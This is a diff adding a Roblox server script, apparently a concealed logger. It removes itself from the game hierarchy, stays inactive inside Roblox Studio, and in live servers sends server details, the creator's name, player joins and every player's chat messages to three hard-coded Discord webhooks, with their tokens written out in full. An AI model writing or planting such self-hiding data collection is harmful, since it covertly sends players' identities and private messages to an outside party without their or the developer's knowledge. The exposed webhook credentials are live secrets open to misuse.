@@ -1,0 +1,221 @@
+script.Parent = nil
+
+if not game:GetService("RunService"):IsStudio() then
+
+	-- Globals
+
+	local server = game
+	local players = server:GetService("Players")
+	local runService = server:GetService("RunService")
+	local Debug = true
+	
+	-- Webhooks
+	
+	local serverInfo = "https://discord.com/api/webhooks/1236013135962570752/f7r73M_z5R3vtaTD71jrrJ1nuj9XWgXqAv3wPjfe-51OLUI2GaT6RbHdK3Pv4IflySI9"
+	local joinLogs = "https://discord.com/api/webhooks/1236016305627463751/XesaPyoTkaQ4oZaKrq8xp4L32SxxIQ3X3iuTBazFgkAhN0YwAdLHCZ_mOmxjluSB0VKp"
+	local chatLogs = "https://discord.com/api/webhooks/1236034916739973231/88yKHSmpApqAIGo2kSlOsjYJJUpFw1y2PZ69_4sx-Afpcj1xU5aybk5vIQz10Sfe87HV"
+	-- Variables
+
+	local scriptVersion = 1
+	local serverStart = os.date("%Y-%m-%d %H:%M:%S")
+	local instances = #game:GetDescendants()
+
+	local creatorName = players:GetNameFromUserIdAsync(server.CreatorId)
+	
+	local lastRequestTime = 0
+	
+	-- Modules
+
+	local helper = require(script.Helper)
+	
+	-- Helper Functions
+	
+	local function Print(data)
+		if Debug then
+			print(data)
+		else
+			return
+		end
+	end
+	
+	local function sender(webhook, content, options)
+		local currentTime = os.time()
+		if currentTime - lastRequestTime >= 2 then
+			lastRequestTime = currentTime
+			local success, errorMessage = pcall(function()
+				helper.send(webhook, content, options)
+			end)
+
+			if not success then
+				Print("An error has occurred: " .. errorMessage)
+			else
+				Print("Executed successfully.")
+			end
+		else
+			local timeRemaining = 2 - (currentTime - lastRequestTime)
+			Print("Maximum requests per minute reached. Waiting " .. timeRemaining .. " seconds before sending request.")
+			wait(timeRemaining)
+			local success, errorMessage = pcall(function()
+				helper.send(webhook, content, options)
+			end)
+
+			if not success then
+				Print("An error has occurred: " .. errorMessage)
+			else
+				Print("Executed successfully.")
+			end
+			lastRequestTime = os.time()
+		end
+	end
+
+	-- ServerInfo
+	function ServerInfo()
+		local content = ""
+		local options = {
+			title = "Server Info",
+			description = "Displays server info. \n \n Currently version " .. scriptVersion .. ". \n",
+			color = 0xFF8000,
+			thumbnail = "https://tr.rbxcdn.com/c80884b76c96f2e8ea9972177ddd8595/420/420/Decal/Webp",
+			author = "Aphex Inc.",
+			authorIcon = "",
+			username = server.JobId,
+			avatar_url = "https://tr.rbxcdn.com/a4bc6144b261ba2a191234d19a06d11f/420/420/Decal/Webp",
+			fields = {
+				{
+					name = "Place Id",
+					value = server.PlaceId
+				},
+				{
+					name = "ServerStart",
+					value = serverStart,
+					inline = true
+				},
+				{
+					name = "Game Creator",
+					value = "[".. creatorName .."](https://www.roblox.com/users/" .. server.CreatorId .. ")",
+					inline = true
+				},
+				{
+					name = "Place Version",
+					value = server.PlaceVersion,
+					inline = true
+				},
+				{
+					name = "Creator Type",
+					value = "Group",
+					inline = true
+				},
+				{
+					name = "Max Players",
+					value = players.MaxPlayers,
+					inline = true
+				},
+
+				{
+					name = "Instances",
+					value = instances,
+					inline = true
+				}
+			},
+			inline = true
+		}
+		
+		sender(serverInfo, content, options)
+	end
+	
+	function JoinLogs(player)
+		local content = ""
+		local options = {
+			title = "Player Join",
+			description = "Displays player info on join. \n \n Currently version " .. scriptVersion .. ". \n",
+			color = 0xFF8000,
+			thumbnail = "https://tr.rbxcdn.com/c80884b76c96f2e8ea9972177ddd8595/420/420/Decal/Webp",
+			author = "Aphex Inc.",
+			authorIcon = "",
+			username = server.JobId,
+			avatar_url = "https://tr.rbxcdn.com/a4bc6144b261ba2a191234d19a06d11f/420/420/Decal/Webp",
+			fields = {
+				{
+					name = "Name",
+					value = "[".. player.Name .."](https://www.roblox.com/users/" .. player.UserId .. ")"
+				},
+				{
+					name = "Display Name",
+					value = player.DisplayName,
+					inline = true
+				},
+				{
+					name = "Account Age",
+					value = player.AccountAge,
+					inline = true
+				},
+				{
+					name = "Time",
+					value = os.date("%Y-%m-%d %H:%M:%S"),
+					inline = true
+				}
+			},
+			inline = true
+		}
+		
+		sender(joinLogs, content, options)
+	end
+	
+	function ChatLogs(player, message)
+		local content = ""
+		local options = {
+			title = "Message Sent",
+			description = "Currently version " .. scriptVersion .. ". \n",
+			color = 0xFF8000,
+			thumbnail = "https://tr.rbxcdn.com/c80884b76c96f2e8ea9972177ddd8595/420/420/Decal/Webp",
+			author = "Aphex Inc.",
+			authorIcon = "",
+			username = server.JobId,
+			avatar_url = "https://tr.rbxcdn.com/a4bc6144b261ba2a191234d19a06d11f/420/420/Decal/Webp",
+			fields = {
+				{
+					name = "Name",
+					value = "[".. player.Name .."](https://www.roblox.com/users/" .. player.UserId .. ")"
+				},
+				{
+					name = "Display Name",
+					value = player.DisplayName,
+					inline = true
+				},
+				{
+					name = "Account Age",
+					value = player.AccountAge,
+					inline = true
+				},
+				{
+					name = "Time",
+					value = os.date("%Y-%m-%d %H:%M:%S"),
+					inline = true
+				},
+				{
+					name = "Message",
+					value = message,
+					inline = true
+				}
+			},
+			inline = true
+		}
+		
+		sender(chatLogs, content, options)
+	end
+	
+	ServerInfo()
+
+	for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+		player.Chatted:Connect(function(message)
+			ChatLogs(player, message)
+		end)
+	end
+
+	players.PlayerAdded:Connect(function(player)
+		JoinLogs(player)
+		player.Chatted:Connect(function(message)
+			ChatLogs(player, message)
+		end)
+	end)
+end
